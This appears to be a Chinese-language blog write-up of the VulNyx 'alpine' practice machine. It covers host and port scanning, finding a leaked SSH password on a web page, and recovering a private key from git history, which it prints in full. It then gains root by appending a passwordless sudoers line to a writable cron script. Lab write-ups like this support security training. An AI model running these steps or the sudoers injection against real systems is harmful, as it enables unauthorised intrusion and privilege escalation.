@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - vulnyx alpine</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>vulnyx alpine</h1>
+    <p>
+        <span class="meta">发布于: 2025-12-14 05:48</span>
+    </p>
+    <div class="post-body">
+        <p>非常简单的一个靶机</p>
+<h2>存活主机扫描</h2>
+<p>使用 arp-scan 扫描局域网内存活主机。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.208 08:00:27:51:76:e8 (Unknown)</code></pre>
+<p>目标主机 IP：192.168.6.208</p>
+<h2>端口扫描</h2>
+<p>nmap 扫描 TCP 全端口。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap -p- -sT -sV 192.168.6.208          
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.66</code></pre>
+<p>开放了 22、80 端口。</p>
+<h2>80 端口 Web 服务探测</h2>
+<p>访问 80 端口，会跳转到 <a href="http://alpine.nyx/，本地配置一个">http://alpine.nyx/，本地配置一个</a> hosts 解析</p>
+<p><img src="/images/vulnyx-alpine/1.png" alt="" /></p>
+<h2>目录扫描</h2>
+<p>使用 dirsearch 进行目录扫描，发现 /profile.html 页面。</p>
+<p><img src="/images/vulnyx-alpine/2.png" alt="" /></p>
+<p>访问 /profile.html，可以找到一个 ssh 用户 developer 的密码 SummerVibes2024!</p>
+<h2>SSH 登录</h2>
+<p>使用 developer 账号通过 ssh 登录，家目录有一个 README.txt 文件。</p>
+<pre><code class="language-bash">developer@alpine:~$ cat README.txt 
+=== SnowPeak Development Notes ===
+
+Hi Developer,
+
+Welcome to the SnowPeak development environment!
+
+IMPORTANT REMINDERS:
+1. The sysadmin user manages the webapp code in their directory
+2. We use git as a deployment pipeline
+3. Don't forget to check the cleaners ! 
+
+If you need elevated access, contact sysadmin.
+
+- Management</code></pre>
+<p><img src="/images/vulnyx-alpine/3.png" alt="" /></p>
+<p>提示开发环境使用了 git 进行代码管理。另外，还有一个 sysadmin 用户，还可能有定时清理脚本。</p>
+<h2>git 记录发现私钥</h2>
+<p>到 sysadmin 家目录的 webapp 目录下，有 .git 目录，可以使用 git log 查看提交记录，直接 <code>git log -p</code> 查看提交记录，这个读取的环境上下滑有点难受，直接重定向到 /tmp 下文件里查看。</p>
+<p>提交记录里有 sysadmin 用户的私钥，保存下来上线 sysadmin 用户。</p>
+<pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA3ZnZAOyE5gZN5QxDnRnYnRfXHwCavg4mJz2HbUWI7p3lGi+tdL6u
+IbqPyjqbH69DcyQCubvORi4domdpqTchLF7PyJlUBHVIo3AULC1kVhMqGvctWQxAgPRvr7
+zM7HGr+NpTPEkM/4BjfJToy706FGjfiXBhjkSiv5cHOlnXxhO44NkKSxvySnXkmYq3PNNF
+5OtjZJg+7+XrZKoUsaipupjOcZgsQCx1Yf1xE4gWIi/jS9kY07R0GtNdqaW2Z9UwXYGMFW
+xGKPtczHbRgcxtdP9ne71C/Zh5zsTPtgWWx8cO+P0N0emTYNDEMlD+4IH9AygBbnAzY978
+qc2jiRSxJwAAA8jbDUur2w1LqwAAAAdzc2gtcnNhAAABAQDdmdkA7ITmBk3lDEOdGdidF9
+cfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQE
+dUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lw
+c6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYi
+L+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q
+3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEnAAAAAwEAAQAAAQAlkP0uoOnurMbru2aC
+7WzBRNddFBcnfPKO2Glq5szN1sqN4+M91U1jvmK9362Ic4e1rzcfEW1ojEzNyUYqP4RKJ1
+CGKygJEXDc9BUXYCKQTPNoWtq/K8qLkeSVICaFNsf2idxubdvcPIGhDwVf9JYx+41ZmUmQ
+eqY0YIADLlPb6g8z0Cgr0cEQg9PEBUi5FZAhji0hIz9k7BAfAzBaed94y+IPF0gG8AtsRm
+oo9XlqTuiphbkNyTVPzE9mKoqR8pECqSLAcx5+YBFP6tOoKh1BwHqWBG5ixw3fWi2HvgPv
+WeVRTozvXzjP1fVlYi/KyayuOLuiwQrlWvtkXwB4S3cRAAAAgEoibXJoCwzdf1naZQ4yZr
+aHnU5Mkx1XsO3X2bWXdIRZzQuLjAlmbwjQyMRWkiRb12D2uc1LwwQ1lzlBOqnCRXjFpM28
+/M8V6ZwYMP5bJeOGJSKEaikzY7blksM2Pls2P8zuhLiL3DnvQlB/7whKfME2MwH4tBDYTO
+7mS6MbKIElAAAAgQD1zPzaJsyt7gAjYgn/v0Wzj7HfVlLqeLR8TGup5MP8uDq6IJV5pLkf
+S8I4dGTOfrhgTw4VNbwy/BZNZErVnKa+zt6EsHgSqFub5ZVgpwRWx6bkk7lKPikZ62uNye
+gtqE7uJVBu12Li4kWuzyF2/IhcSh1Sp9B7fnF6p5b+t1H84wAAAIEA5svMbW9WTDB5hvgo
+ii5H6OZuIPGNKeEndKVquBeLjKR2QQrK9KQ0d/OgIu4ioEOmQ+NA1tWKr5uXJ4hdBvDCoS
+4tqjiIBNSTx1qkV6tpcbKDaIjTzdCvAJ8wOMymShOVVJkmXvgIsJuydR7OQ+StvR0DRDGp
+rkFejyhcyFIbke0AAAARc3lzYWRtaW5Ac25vd3BlYWsBAg==
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+<p><img src="/images/vulnyx-alpine/4.png" alt="" /></p>
+<p><img src="/images/vulnyx-alpine/5.png" alt="" /></p>
+<h2>可写定时脚本提权</h2>
+<p>在 /opt 目录下，有一个定时清理脚本 cleaner.sh，sysadmin 用户对其有写权限，并且是 root 运行。</p>
+<p>或者你可以查找最近变动的文件</p>
+<pre><code class="language-bash"># 查找最近7天变动的文件
+find / \
+  \( -path /run -o -path /sys -o -path /proc -o -path /var/lib -o -path /dev -o -path /usr -o -path /var/log -o -path /var/cache -o -path /boot/grub \) -prune -o \
+  \( -mtime -7 -o -ctime -7 \) -print 2&gt;/dev/null</code></pre>
+<p><img src="/images/vulnyx-alpine/6.png" alt="" /></p>
+<p>或者跑 pspy64 ，也可以找到这个文件，uid 0 执行，也就是 root 权限执行。</p>
+<p><img src="/images/vulnyx-alpine/7.png" alt="" /></p>
+<p><img src="/images/vulnyx-alpine/8.png" alt="" /></p>
+<p>sysadmin 用户可以编辑这个脚本，可以在脚本里写一个 sudo 授权，给 sysadmin 用户添加一个无密码 sudo 权限。</p>
+<pre><code class="language-bash">echo "sysadmin ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers.d/111</code></pre>
+<p>稍等即可</p>
+<p><img src="/images/vulnyx-alpine/9.png" alt="" /></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#alpine</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
